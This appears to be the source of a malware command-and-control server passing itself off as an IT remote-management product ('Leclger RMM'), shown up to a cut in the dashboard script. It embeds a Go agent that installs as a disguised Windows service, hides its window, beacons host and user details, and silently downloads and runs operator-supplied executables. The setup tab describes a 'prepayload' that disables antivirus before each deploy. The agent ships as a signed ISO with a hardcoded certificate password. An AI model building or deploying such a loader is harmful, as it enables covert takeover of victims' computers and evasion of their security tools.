const express    = require('express');
const multer     = require('multer');
const path       = require('path');
const fs         = require('fs');
const crypto     = require('crypto');
const { spawn }  = require('child_process');

const app  = express();
const PORT = 3000;

// ── Directories ───────────────────────────────────────────────
const DIRS = {
  payloads: path.join(__dirname, 'payloads'),
  agents:   path.join(__dirname, 'agents'),
  build:    path.join(__dirname, 'build'),
};
Object.values(DIRS).forEach(d => { if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true }); });

// ── State ─────────────────────────────────────────────────────
const devices       = {};   // { deviceId: deviceObj }
const deployQueue   = {};   // { deviceId: [{stage, url}] }
const devicePayload = {};   // { deviceId: filename }  — per-device payload
const builds        = {};   // { buildId: { status, log, isoFile } }

const PREPAYLOAD_NAME = 'prepayload.exe';
const PREPAYLOAD_PATH = path.join(DIRS.payloads, PREPAYLOAD_NAME);
const prepayloadReady = () => fs.existsSync(PREPAYLOAD_PATH);

app.use(express.json());

// ── Restore state on startup ──────────────────────────────────
// (payloads persist on disk — no state lost on pm2 restart)

// ── Multer ────────────────────────────────────────────────────
const makeUpload = (dest) => multer({
  storage: multer.diskStorage({
    destination: (req, file, cb) => cb(null, dest),
    filename:    (req, file, cb) => cb(null, file.originalname),
  })
});

// ── Static routes ─────────────────────────────────────────────
app.use('/payloads', express.static(DIRS.payloads));
app.use('/agents',   express.static(DIRS.agents));

// ================================================================
// AGENT ENDPOINTS
// ================================================================
app.post('/api/checkin', (req, res) => {
  const { hostname, ip, os, username } = req.body;
  if (!hostname) return res.json({ action: 'none' });

  const deviceId = crypto.createHash('md5').update(hostname + (username || '')).digest('hex');
  devices[deviceId] = {
    deviceId, hostname,
    ip:       ip       || 'unknown',
    os:       os       || 'windows',
    username: username || 'unknown',
    lastSeen: new Date().toISOString(),
    status:   'online',
  };

  if (deployQueue[deviceId] && deployQueue[deviceId].length > 0) {
    const next = deployQueue[deviceId].shift();
    console.log(`[DEPLOY] Stage "${next.stage}" → ${hostname}`);
    return res.json({ action: 'deploy', payload_url: next.url });
  }

  res.json({ action: 'none' });
});

// ================================================================
// DEVICES API
// ================================================================
app.get('/api/devices', (req, res) => {
  const now = Date.now();
  const result = Object.values(devices).map(d => ({
    ...d,
    status:          (now - new Date(d.lastSeen).getTime() < 3 * 60 * 1000) ? 'online' : 'offline',
    assignedPayload: devicePayload[d.deviceId] || null,
    pendingStages:   (deployQueue[d.deviceId] || []).length,
  }));
  res.json(result);
});

app.get('/api/status', (req, res) => {
  res.json({
    prepayload_ready: prepayloadReady(),
    prepayload_name:  PREPAYLOAD_NAME,
    agents_built:     fs.readdirSync(DIRS.agents).filter(f => f.endsWith('.iso')),
  });
});

// ── List available agents (built ISOs) ────────────────────────
app.get('/api/agents', (req, res) => {
  const files = fs.readdirSync(DIRS.agents)
    .filter(f => f.endsWith('.iso') || f.endsWith('.exe') || f.endsWith('.msi'))
    .map(f => ({
      name: f,
      url:  `/agents/${f}`,
      size: Math.round(fs.statSync(path.join(DIRS.agents, f)).size / 1024 / 1024 * 10) / 10 + ' MB',
      date: fs.statSync(path.join(DIRS.agents, f)).mtime.toISOString(),
    }));
  res.json(files);
});

// ================================================================
// PAYLOAD UPLOAD
// ================================================================

// Upload prepayload.exe (one-time)
app.post('/api/upload-prepayload', makeUpload(DIRS.payloads).single('prepayload'), (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'No file' });
  if (req.file.originalname !== PREPAYLOAD_NAME) {
    fs.unlinkSync(req.file.path);
    return res.status(400).json({ error: 'Must be named prepayload.exe' });
  }
  console.log('[SETUP] prepayload.exe uploaded');
  res.json({ success: true });
});

// Upload payload for a SPECIFIC device
app.post('/api/upload/:deviceId', makeUpload(DIRS.payloads).single('payload'), (req, res) => {
  const { deviceId } = req.params;
  if (!req.file) return res.status(400).json({ error: 'No file' });
  if (!devices[deviceId]) {
    fs.unlinkSync(req.file.path);
    return res.status(404).json({ error: 'Device not found' });
  }
  devicePayload[deviceId] = req.file.originalname;
  console.log(`[UPLOAD] ${req.file.originalname} → ${devices[deviceId].hostname}`);
  res.json({ success: true, filename: req.file.originalname });
});

// Upload same payload to ALL devices
app.post('/api/upload-all', makeUpload(DIRS.payloads).single('payload'), (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'No file' });
  const filename = req.file.originalname;
  Object.keys(devices).forEach(id => { devicePayload[id] = filename; });
  console.log(`[UPLOAD-ALL] ${filename} → all devices`);
  res.json({ success: true, filename, deviceCount: Object.keys(devices).length });
});

// ================================================================
// DEPLOY
// ================================================================
function buildDeployQueue(deviceId, host) {
  const payload = devicePayload[deviceId];
  if (!payload) return false;
  const payloadUrl = `http://${host}/payloads/${payload}`;
  const preUrl     = `http://${host}/payloads/${PREPAYLOAD_NAME}`;

  deployQueue[deviceId] = prepayloadReady()
    ? [{ stage: 'prepayload', url: preUrl }, { stage: 'main-agent', url: payloadUrl }]
    : [{ stage: 'main-agent', url: payloadUrl }];

  return true;
}

app.post('/api/deploy/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  if (!devices[deviceId])        return res.status(404).json({ error: 'Device not found' });
  if (!devicePayload[deviceId])  return res.status(400).json({ error: 'No payload assigned to this device' });

  const host = req.headers.host || `localhost:${PORT}`;
  buildDeployQueue(deviceId, host);

  const d   = devices[deviceId];
  const msg = prepayloadReady()
    ? `Queued for ${d.hostname} — AV exclusion first, agent ~60s later`
    : `Queued for ${d.hostname} — no prepayload, agent only`;

  console.log(`[DEPLOY] ${msg}`);
  res.json({ success: true, message: msg });
});

app.post('/api/deploy-all', (req, res) => {
  const host   = req.headers.host || `localhost:${PORT}`;
  const online = Object.values(devices).filter(d => {
    return (Date.now() - new Date(d.lastSeen).getTime() < 3 * 60 * 1000);
  });
  const queued  = [];
  const skipped = [];

  online.forEach(d => {
    if (buildDeployQueue(d.deviceId, host)) {
      queued.push(d.hostname);
    } else {
      skipped.push(d.hostname);
    }
  });

  res.json({
    success: true,
    queued,
    skipped,
    message: `Queued: ${queued.length} devices${skipped.length ? ` | Skipped (no payload): ${skipped.join(', ')}` : ''}`,
  });
});

// ================================================================
// BUILDER — Cross-compile agent on VPS
// ================================================================
const AGENT_SRC = path.join(__dirname, 'agent-src');
if (!fs.existsSync(AGENT_SRC)) fs.mkdirSync(AGENT_SRC, { recursive: true });

// Write agent source files to disk on first run
function ensureAgentSrc() {
  const mainGoPath = path.join(AGENT_SRC, 'main.go');
  const sysGoPath  = path.join(AGENT_SRC, 'syscall_windows.go');
  const goModPath  = path.join(AGENT_SRC, 'go.mod');

  if (!fs.existsSync(mainGoPath)) {
    fs.writeFileSync(mainGoPath, AGENT_MAIN_GO);
  }
  if (!fs.existsSync(sysGoPath)) {
    fs.writeFileSync(sysGoPath, SYSCALL_WINDOWS_GO);
  }
  if (!fs.existsSync(goModPath)) {
    fs.writeFileSync(goModPath, 'module leclger-agent\n\ngo 1.21\n\nrequire golang.org/x/sys v0.0.0-20231127182322-b307f7c6d45a\n');
  }
}

app.post('/api/build', (req, res) => {
  const {
    company_name  = 'Leclger IT Solutions',
    exe_name      = 'LeclgerSetup.exe',
    iso_name      = 'LeclgerSetup.iso',
    service_name  = 'LeclgerService',
    server_url    = `http://rmm.leclger.qzz.io`,
    version       = '1.0.0',
  } = req.body;

  // Validate
  if (!exe_name.endsWith('.exe')) return res.status(400).json({ error: 'exe_name must end with .exe' });
  if (!iso_name.endsWith('.iso')) return res.status(400).json({ error: 'iso_name must end with .iso' });
  if (service_name.includes(' '))  return res.status(400).json({ error: 'service_name cannot have spaces' });

  const buildId  = crypto.randomBytes(6).toString('hex');
  const exeBase  = exe_name.replace(/\.exe$/i, '');
  const agentExe = path.join(DIRS.agents, exe_name);
  const isoOut   = path.join(DIRS.agents, iso_name);
  const isoSrc   = path.join(DIRS.agents, `iso-src-${buildId}`);

  builds[buildId] = { status: 'building', log: [], isoFile: iso_name, isoUrl: `/agents/${iso_name}` };
  const log = (msg) => {
    builds[buildId].log.push(msg);
    console.log(`[BUILD ${buildId}] ${msg}`);
  };

  res.json({ success: true, buildId, message: 'Build started' });

  // Run build asynchronously
  (async () => {
    try {
      ensureAgentSrc();
      fs.mkdirSync(isoSrc, { recursive: true });

      log('Step 1/4: Cross-compiling agent for Windows...');

      // Write customised main.go with injected values
      const customMain = AGENT_MAIN_GO
        .replace('__SERVER_URL__',   server_url)
        .replace('__SERVICE_NAME__', service_name)
        .replace('__COMPANY_NAME__', company_name);
      const tmpDir = path.join(DIRS.build, buildId);
      fs.mkdirSync(tmpDir, { recursive: true });
      fs.writeFileSync(path.join(tmpDir, 'main.go'), customMain);
      fs.writeFileSync(path.join(tmpDir, 'syscall_windows.go'), SYSCALL_WINDOWS_GO);
      fs.writeFileSync(path.join(tmpDir, 'go.mod'), 'module leclger-agent\n\ngo 1.21\n');

      // go mod tidy to fetch dependencies
      await runCmd('go', ['mod', 'tidy'], tmpDir, { GOOS: 'windows', GOARCH: 'amd64', CGO_ENABLED: '0', ...process.env }, log);

      // Cross-compile
      await runCmd('go', [
        'build',
        '-ldflags', `-s -w -H windowsgui`,
        '-o', agentExe,
        '.',
      ], tmpDir, {
        ...process.env,
        GOOS: 'windows', GOARCH: 'amd64', CGO_ENABLED: '0',
      }, log);

      if (!fs.existsSync(agentExe)) throw new Error('go build produced no output');
      log(`Step 1/4 complete: ${exe_name} (${Math.round(fs.statSync(agentExe).size/1024)}KB)`);

      // Sign with osslsigncode if cert available
      log('Step 2/4: Signing...');
      const certPath = path.join(__dirname, 'leclger-cert.pfx');
      if (fs.existsSync(certPath)) {
        const signedExe = agentExe + '.signed.exe';
        try {
          await runCmd('osslsigncode', [
            'sign',
            '-pkcs12', certPath,
            '-pass',   'Leclger@2026',
            '-n',      company_name,
            '-t',      'http://timestamp.digicert.com',
            '-in',     agentExe,
            '-out',    signedExe,
          ], __dirname, process.env, log);
          fs.renameSync(signedExe, agentExe);
          log('Step 2/4 complete: Signed');
        } catch(e) {
          log('Step 2/4: Signing skipped (cert error) — continuing unsigned');
        }
      } else {
        log('Step 2/4: No cert found at /var/www/leclger-rmm/leclger-cert.pfx — skipping signing');
      }

      // Build ISO with genisoimage
      log('Step 3/4: Building ISO...');
      fs.copyFileSync(agentExe, path.join(isoSrc, exe_name));
      if (fs.existsSync(isoOut)) fs.unlinkSync(isoOut);
      await runCmd('genisoimage', [
        '-o',  isoOut,
        '-V',  exeBase.toUpperCase().substring(0, 32),
        '-J',
        '-r',
        isoSrc,
      ], __dirname, process.env, log);

      if (!fs.existsSync(isoOut)) throw new Error('genisoimage produced no output');
      log(`Step 3/4 complete: ${iso_name} (${Math.round(fs.statSync(isoOut).size/1024/1024*10)/10}MB)`);

      // Cleanup temp dirs
      log('Step 4/4: Cleaning up...');
      fs.rmSync(tmpDir,  { recursive: true, force: true });
      fs.rmSync(isoSrc,  { recursive: true, force: true });
      log('Done');

      builds[buildId].status  = 'complete';
      builds[buildId].isoUrl  = `/agents/${iso_name}`;
      builds[buildId].exeUrl  = `/agents/${exe_name}`;
      builds[buildId].isoFile = iso_name;
      console.log(`[BUILD ${buildId}] COMPLETE → ${iso_name}`);

    } catch (err) {
      builds[buildId].status = 'error';
      builds[buildId].error  = err.message;
      log(`ERROR: ${err.message}`);
    }
  })();
});

app.get('/api/build/:buildId', (req, res) => {
  const b = builds[req.params.buildId];
  if (!b) return res.status(404).json({ error: 'Build not found' });
  res.json(b);
});

// Helper: run a command and stream output to log
function runCmd(cmd, args, cwd, env, log) {
  return new Promise((resolve, reject) => {
    const proc = spawn(cmd, args, { cwd, env });
    proc.stdout.on('data', d => log(d.toString().trim()));
    proc.stderr.on('data', d => log(d.toString().trim()));
    proc.on('close', code => {
      if (code === 0) resolve();
      else reject(new Error(`${cmd} exited with code ${code}`));
    });
    proc.on('error', reject);
  });
}

// ================================================================
// AGENT SOURCE CODE (embedded as JS strings)
// ================================================================
const SYSCALL_WINDOWS_GO = `package main

import "syscall"

func getSysProcAttr() *syscall.SysProcAttr {
	return &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x08000000,
	}
}
`;

const AGENT_MAIN_GO = `package main

import (
	"bytes"
	"encoding/json"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"golang.org/x/sys/windows/svc"
	"golang.org/x/sys/windows/svc/mgr"
)

var (
	ServerURL   = "__SERVER_URL__"
	ServiceName = "__SERVICE_NAME__"
	CompanyName = "__COMPANY_NAME__"
)

type DeviceInfo struct {
	Hostname string \`json:"hostname"\`
	OS       string \`json:"os"\`
	IP       string \`json:"ip"\`
	Username string \`json:"username"\`
}

type Command struct {
	Action     string \`json:"action"\`
	PayloadURL string \`json:"payload_url"\`
}

func getIP() string {
	resp, err := http.Get("https://api.ipify.org")
	if err != nil {
		return "unknown"
	}
	defer resp.Body.Close()
	buf := new(bytes.Buffer)
	buf.ReadFrom(resp.Body)
	return strings.TrimSpace(buf.String())
}

func checkin() (*Command, error) {
	hostname, _ := os.Hostname()
	info := DeviceInfo{
		Hostname: hostname,
		OS:       runtime.GOOS,
		IP:       getIP(),
		Username: os.Getenv("USERNAME"),
	}
	data, _ := json.Marshal(info)
	resp, err := http.Post(ServerURL+"/api/checkin", "application/json", bytes.NewBuffer(data))
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	var cmd Command
	json.NewDecoder(resp.Body).Decode(&cmd)
	return &cmd, nil
}

func deployPayload(url string) {
	tmpFile := os.TempDir() + "\\\\leclger-payload.msi"
	resp, err := http.Get(url)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	buf := new(bytes.Buffer)
	buf.ReadFrom(resp.Body)
	os.WriteFile(tmpFile, buf.Bytes(), 0755)
	if strings.HasSuffix(strings.ToLower(url), ".msi") {
		exec.Command("msiexec", "/i", tmpFile, "/quiet", "/norestart").Start()
	} else {
		tmpExe := os.TempDir() + "\\\\leclger-payload.exe"
		os.WriteFile(tmpExe, buf.Bytes(), 0755)
		exec.Command(tmpExe, "/silent", "/verysilent", "/quiet").Start()
	}
}

func runLoop() {
	for {
		cmd, err := checkin()
		if err == nil && cmd != nil && cmd.Action == "deploy" && cmd.PayloadURL != "" {
			deployPayload(cmd.PayloadURL)
		}
		time.Sleep(60 * time.Second)
	}
}

type windowsService struct{}

func (s *windowsService) Execute(args []string, r <-chan svc.ChangeRequest, status chan<- svc.Status) (bool, uint32) {
	status <- svc.Status{State: svc.Running, Accepts: svc.AcceptStop | svc.AcceptShutdown}
	go runLoop()
	for c := range r {
		switch c.Cmd {
		case svc.Stop, svc.Shutdown:
			status <- svc.Status{State: svc.StopPending}
			return false, 0
		}
	}
	return false, 0
}

func installService() {
	exePath, _ := os.Executable()
	m, err := mgr.Connect()
	if err != nil {
		return
	}
	defer m.Disconnect()
	s, err := m.CreateService(ServiceName, exePath, mgr.Config{
		DisplayName: CompanyName,
		Description: CompanyName + " Remote Management Service",
		StartType:   mgr.StartAutomatic,
	})
	if err != nil {
		return
	}
	defer s.Close()
	s.Start()
}

func main() {
	if len(os.Args) > 1 && strings.EqualFold(os.Args[1], "install") {
		installService()
		return
	}
	isService, _ := svc.IsWindowsService()
	if isService {
		svc.Run(ServiceName, &windowsService{})
	} else {
		runLoop()
	}
}
`;

// ================================================================
// DASHBOARD UI
// ================================================================
app.get('/', (req, res) => {
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Leclger RMM</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#0a0d14;color:#e2e8f0;min-height:100vh}
.topbar{background:#111827;border-bottom:1px solid #1f2937;padding:0 24px;height:56px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100}
.logo{font-size:17px;font-weight:700;color:#fff;display:flex;align-items:center;gap:10px}
.logo-dot{width:28px;height:28px;background:linear-gradient(135deg,#3b82f6,#8b5cf6);border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:14px}
.nav{display:flex;gap:4px}
.nav-btn{padding:6px 14px;border-radius:8px;font-size:13px;font-weight:500;cursor:pointer;border:none;background:transparent;color:#6b7280;transition:all .15s}
.nav-btn.active,.nav-btn:hover{background:#1f2937;color:#f3f4f6}
.badge{padding:3px 8px;border-radius:20px;font-size:11px;font-weight:600}
.badge-green{background:rgba(34,197,94,0.12);color:#22c55e}
.badge-yellow{background:rgba(234,179,8,0.12);color:#eab308}
.badge-red{background:rgba(239,68,68,0.12);color:#ef4444}
.badge-blue{background:rgba(59,130,246,0.12);color:#3b82f6}
.main{padding:20px 24px;max-width:1400px;margin:0 auto}
.tab{display:none}.tab.active{display:block}
.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:20px}
.stat{background:#111827;border:1px solid #1f2937;border-radius:12px;padding:16px 18px}
.stat-label{font-size:11px;color:#6b7280;text-transform:uppercase;letter-spacing:.06em;margin-bottom:6px}
.stat-val{font-size:26px;font-weight:700}
.c-green{color:#22c55e}.c-red{color:#ef4444}.c-blue{color:#3b82f6}.c-yellow{color:#eab308}
.card{background:#111827;border:1px solid #1f2937;border-radius:12px;overflow:hidden;margin-bottom:16px}
.card-head{padding:14px 18px;border-bottom:1px solid #1f2937;display:flex;align-items:center;justify-content:space-between;background:#0f172a}
.card-title{font-size:13px;font-weight:600;color:#f1f5f9}
.pre-banner{padding:10px 18px;font-size:12px;display:flex;align-items:center;gap:8px}
.pre-banner.ok{background:rgba(34,197,94,0.06);color:#22c55e;border-bottom:1px solid rgba(34,197,94,0.12)}
.pre-banner.warn{background:rgba(234,179,8,0.06);color:#eab308;border-bottom:1px solid rgba(234,179,8,0.12)}
table{width:100%;border-collapse:collapse}
th{padding:10px 14px;text-align:left;font-size:11px;font-weight:600;color:#6b7280;text-transform:uppercase;letter-spacing:.05em;border-bottom:1px solid #1f2937;background:#0a0d14}
td{padding:12px 14px;font-size:13px;border-bottom:1px solid #111827;vertical-align:middle}
tr:last-child td{border-bottom:none}
tr:hover td{background:#0f172a}
.online-dot{width:7px;height:7px;border-radius:50%;display:inline-block;margin-right:5px}
.dot-on{background:#22c55e;box-shadow:0 0 5px #22c55e}.dot-off{background:#ef4444}
.btn{padding:6px 14px;border-radius:7px;font-size:12px;font-weight:500;border:none;cursor:pointer;transition:all .15s;display:inline-flex;align-items:center;gap:5px;white-space:nowrap}
.btn:disabled{opacity:.4;cursor:not-allowed}
.btn-primary{background:#3b82f6;color:#fff}.btn-primary:hover:not(:disabled){background:#2563eb}
.btn-green{background:rgba(34,197,94,0.12);color:#22c55e;border:1px solid rgba(34,197,94,0.2)}.btn-green:hover:not(:disabled){background:rgba(34,197,94,0.2)}
.btn-red{background:rgba(239,68,68,0.12);color:#ef4444;border:1px solid rgba(239,68,68,0.2)}.btn-red:hover:not(:disabled){background:rgba(239,68,68,0.2)}
.btn-yellow{background:rgba(234,179,8,0.12);color:#eab308;border:1px solid rgba(234,179,8,0.2)}.btn-yellow:hover:not(:disabled){background:rgba(234,179,8,0.2)}
.btn-ghost{background:transparent;color:#6b7280;border:1px solid #1f2937}.btn-ghost:hover{background:#1f2937;color:#f3f4f6}
.btn-sm{padding:4px 10px;font-size:11px}
.fi{display:none}
.upload-zone{border:1px dashed #374151;border-radius:8px;padding:8px 12px;font-size:12px;color:#6b7280;cursor:pointer;display:inline-flex;align-items:center;gap:6px;transition:all .15s;background:transparent}
.upload-zone:hover{border-color:#3b82f6;color:#3b82f6;background:rgba(59,130,246,0.05)}
.device-payload{display:flex;align-items:center;gap:6px;flex-wrap:wrap}
.payload-chip{font-size:11px;padding:2px 8px;border-radius:20px;background:rgba(59,130,246,0.12);color:#3b82f6;border:1px solid rgba(59,130,246,0.2);display:inline-flex;align-items:center;gap:4px}
.payload-chip.none{background:rgba(107,114,128,0.1);color:#6b7280;border-color:#1f2937}
.empty{text-align:center;padding:40px;color:#4b5563;font-size:13px}
.mono{font-family:'SF Mono',Monaco,monospace;font-size:11px;color:#94a3b8}
.toast{position:fixed;bottom:20px;right:20px;padding:11px 18px;border-radius:10px;font-size:13px;font-weight:500;display:none;z-index:999;box-shadow:0 4px 24px rgba(0,0,0,.5);max-width:420px;line-height:1.4}
.toast.show{display:block}
.toast.success{background:#052e16;border:1px solid rgba(34,197,94,0.3);color:#22c55e}
.toast.error{background:#2d0a0a;border:1px solid rgba(239,68,68,0.3);color:#ef4444}
.toast.info{background:#0c1a3a;border:1px solid rgba(59,130,246,0.3);color:#60a5fa}

/* Builder */
.builder-form{padding:20px;display:grid;grid-template-columns:1fr 1fr;gap:16px}
.field{display:flex;flex-direction:column;gap:5px}
.field.full{grid-column:1/-1}
label{font-size:11px;color:#6b7280;text-transform:uppercase;letter-spacing:.08em}
input[type=text],input[type=url]{background:#0a0d14;border:1px solid #1f2937;border-radius:7px;padding:8px 12px;color:#f1f5f9;font-size:13px;outline:none;transition:border-color .15s;width:100%}
input:focus{border-color:#3b82f6}
input::placeholder{color:#374151}
.build-btn{margin:0 20px 20px;width:calc(100% - 40px);padding:12px;border-radius:8px;font-size:14px;font-weight:600;background:linear-gradient(135deg,#3b82f6,#8b5cf6);color:#fff;border:none;cursor:pointer;transition:all .2s}
.build-btn:hover{opacity:.9;transform:translateY(-1px)}
.build-btn:disabled{opacity:.5;transform:none;cursor:not-allowed}
.build-log{background:#020617;border-top:1px solid #1f2937;padding:16px;font-family:monospace;font-size:12px;color:#64748b;height:200px;overflow-y:auto;line-height:1.7;display:none}
.build-log.show{display:block}
.log-success{color:#22c55e}.log-error{color:#ef4444}.log-info{color:#60a5fa}
.agent-list{padding:16px;display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:12px}
.agent-card{background:#0a0d14;border:1px solid #1f2937;border-radius:10px;padding:14px;display:flex;flex-direction:column;gap:8px}
.agent-card-name{font-size:13px;font-weight:600;color:#f1f5f9}
.agent-card-meta{font-size:11px;color:#6b7280}
.agent-card-btns{display:flex;gap:6px;margin-top:4px}

/* Upload area in devices table */
.device-upload{display:flex;align-items:center;gap:6px}
</style>
</head>
<body>

<div class="topbar">
  <div class="logo"><div class="logo-dot">🛡</div>Leclger RMM</div>
  <div class="nav">
    <button class="nav-btn active" onclick="switchTab('devices')">Devices</button>
    <button class="nav-btn" onclick="switchTab('builder')">Agent Builder</button>
    <button class="nav-btn" onclick="switchTab('setup')">Setup</button>
  </div>
  <span id="refreshBadge" class="badge badge-blue">Live</span>
</div>

<div class="main">

<!-- ── DEVICES TAB ─────────────────────────────────────────── -->
<div class="tab active" id="tab-devices">
  <div class="stats">
    <div class="stat"><div class="stat-label">Total</div><div class="stat-val c-blue" id="sTot">0</div></div>
    <div class="stat"><div class="stat-label">Online</div><div class="stat-val c-green" id="sOn">0</div></div>
    <div class="stat"><div class="stat-label">Offline</div><div class="stat-val c-red" id="sOff">0</div></div>
    <div class="stat"><div class="stat-label">Pending</div><div class="stat-val c-yellow" id="sPend">0</div></div>
  </div>

  <div class="card">
    <div class="card-head">
      <span class="card-title">💻 Enrolled Devices</span>
      <div style="display:flex;gap:8px">
        <button class="btn btn-red btn-sm" onclick="deployAll()">Deploy ALL</button>
        <button class="btn btn-ghost btn-sm" onclick="loadDevices()">↻ Refresh</button>
      </div>
    </div>
    <div id="preBanner" class="pre-banner warn">⚠️ prepayload.exe not uploaded</div>
    <div id="deviceTable"><div class="empty">Waiting for devices to check in...</div></div>
  </div>
</div>

<!-- ── BUILDER TAB ─────────────────────────────────────────── -->
<div class="tab" id="tab-builder">
  <div class="card" style="margin-bottom:16px">
    <div class="card-head"><span class="card-title">⚡ Build Custom Agent</span></div>
    <div class="builder-form">
      <div class="field">
        <label>Company Name</label>
        <input type="text" id="bCompany" value="Leclger IT Solutions" placeholder="Your Company Name">
      </div>
      <div class="field">
        <label>Service Name (no spaces)</label>
        <input type="text" id="bService" value="LeclgerService" placeholder="CompanyService">
      </div>
      <div class="field">
        <label>EXE Filename</label>
        <input type="text" id="bExe" value="LeclgerSetup.exe" placeholder="Setup.exe">
      </div>
      <div class="field">
        <label>ISO Filename</label>
        <input type="text" id="bIso" value="LeclgerSetup.iso" placeholder="Setup.iso">
      </div>
      <div class="field full">
        <label>Server URL</label>
        <input type="url" id="bServer" value="http://rmm.leclger.qzz.io" placeholder="http://your-server.com">
      </div>
    </div>
    <button class="build-btn" id="buildBtn" onclick="startBuild()">⚡ Build Agent ISO</button>
    <div class="build-log" id="buildLog"></div>
  </div>

  <div class="card">
    <div class="card-head">
      <span class="card-title">📦 Built Agents</span>
      <button class="btn btn-ghost btn-sm" onclick="loadAgents()">↻ Refresh</button>
    </div>
    <div class="agent-list" id="agentList"><div class="empty">No agents built yet</div></div>
  </div>
</div>

<!-- ── SETUP TAB ──────────────────────────────────────────── -->
<div class="tab" id="tab-setup">
  <div class="card">
    <div class="card-head">
      <span class="card-title">🔒 Pre-Payload (Auto AV Exclusion)</span>
      <span id="preStatusBadge" class="badge badge-yellow">Not uploaded</span>
    </div>
    <div id="setupBanner" class="pre-banner warn">⚠️ Upload prepayload.exe — it runs automatically before every agent deploy to disable AV</div>
    <div style="padding:16px;display:flex;align-items:center;gap:12px">
      <label class="upload-zone" for="preInput">⬆ Upload prepayload.exe</label>
      <input type="file" id="preInput" class="fi" accept=".exe" onchange="uploadPrepayload(this)">
      <span id="preUploadMsg" style="font-size:12px;color:#6b7280">One-time setup — auto-runs before every deploy</span>
    </div>
  </div>
  <div class="card">
    <div class="card-head"><span class="card-title">ℹ️ Deploy Flow</span></div>
    <div style="padding:16px;font-size:13px;color:#6b7280;line-height:2">
      <div>① Device downloads & installs agent ISO from your website</div>
      <div>② Device appears in dashboard</div>
      <div>③ Upload any payload (.exe / .msi) to that device</div>
      <div>④ Click Deploy → prepayload.exe runs first (disables AV silently)</div>
      <div>⑤ 60 seconds later → your payload installs cleanly with no AV interference</div>
      <div>⑥ Device appears in Syncro / NinjaOne dashboard automatically</div>
    </div>
  </div>
</div>

</div><!-- /main -->
<div class="toast" id="toast"></div>

<script>
// ── State ─────────────────────────────────────────────────────
let currentTab = 'devices';
let devices = [];
let currentBuildId = null;
let buildPollTimer = null;
let agents = [];

// ── Tabs ──────────────────────────────────────────────────────
function switchTab(name) {
  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
  document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
  document.getElementById('tab-' + name).classList.add('active');
  event.target.classList.add('active');
  currentTab = name;
  if (name === 'builder') loadAgents();
  if (name === 'setup')   checkStatus();
}

// ── Toast ─────────────────────────────────────────────────────
function toast(msg, type='success') {
  const t = document.getElementById('toast');
  t.textContent = msg; t.className = 'toast show ' + type;
  setTimeout(() => t.className = 'toast', 5000);
}

// ── Status ────────────────────────────────────────────────────
async function checkStatus() {
  try {
    const r = await fetch('/api/status');
    const s = await r.json();
    const ready = s.prepayload_ready;
    const badge   = document.getElementById('preStatusBadge');
    const banner  = document.getElementById('preBanner');
    const sBanner = document.getElementById('setupBanner');

    if (ready) {
      badge.textContent = '✅ Active'; badge.className = 'badge badge-green';
      banner.className  = 'pre-banner ok';
      banner.textContent = '✅ prepayload.exe active — AV exclusion runs automatically before every deploy';
      if (sBanner) { sBanner.className='pre-banner ok'; sBanner.textContent='✅ prepayload.exe is active'; }
    } else {
      badge.textContent = '⚠️ Not uploaded'; badge.className = 'badge badge-yellow';
      banner.className  = 'pre-banner warn';
      banner.textContent = '⚠️ prepayload.exe not uploaded — go to Setup tab to upload it';
      if (sBanner) { sBanner.className='pre-banner warn'; sBanner.textContent='⚠️ Upload prepayload.exe below'; }
    }
  } catch(e) {}
}

// ── Devices ───────────────────────────────────────────────────
async function loadDevices() {
  try {
    const r = await fetch('/api/devices');
    devices = await r.json();
    const online = devices.filter(d => d.status === 'online').length;
    const pend   = devices.reduce((a,d) => a + (d.pendingStages||0), 0);
    document.getElementById('sTot').textContent  = devices.length;
    document.getElementById('sOn').textContent   = online;
    document.getElementById('sOff').textContent  = devices.length - online;
    document.getElementById('sPend').textContent = pend;
    document.getElementById('refreshBadge').textContent = 'Updated ' + new Date().toLocaleTimeString();

    if (!devices.length) {
      document.getElementById('deviceTable').innerHTML =
        '<div class="empty">No devices yet — install the agent on a device to enroll it</div>';
      return;
    }

    const rows = devices.map(d => {
      const isOn = d.status === 'online';
      const payloadChip = d.assignedPayload
        ? \`<span class="payload-chip">📦 \${d.assignedPayload}</span>\`
        : \`<span class="payload-chip none">no payload</span>\`;

      return \`<tr>
        <td><b>\${d.hostname}</b><br><span class="mono">\${d.ip}</span></td>
        <td>\${d.username}<br><span class="mono">\${d.os}</span></td>
        <td><span class="online-dot \${isOn?'dot-on':'dot-off'}"></span>\${d.status}<br>
            <span class="mono">\${new Date(d.lastSeen).toLocaleTimeString()}</span></td>
        <td>
          <div class="device-upload">
            \${payloadChip}
            <label class="upload-zone" for="up-\${d.deviceId}" title="Upload payload for this device">⬆</label>
            <input type="file" id="up-\${d.deviceId}" class="fi" accept=".exe,.msi"
              onchange="uploadForDevice('\${d.deviceId}', '\${d.hostname}', this)">
          </div>
        </td>
        <td>
          <button class="btn btn-green btn-sm" onclick="deployDevice('\${d.deviceId}','\${d.hostname}')"
            \${!d.assignedPayload || !isOn ? 'disabled' : ''}>
            \${d.pendingStages > 0 ? '⏳ Pending' : 'Deploy'}
          </button>
        </td>
      </tr>\`;
    }).join('');

    document.getElementById('deviceTable').innerHTML = \`
      <table>
        <thead><tr>
          <th>Device</th><th>User / OS</th><th>Status</th><th>Payload</th><th>Action</th>
        </tr></thead>
        <tbody>\${rows}</tbody>
      </table>\`;

  } catch(e) { console.error(e); }
}

// ── Per-device upload ─────────────────────────────────────────
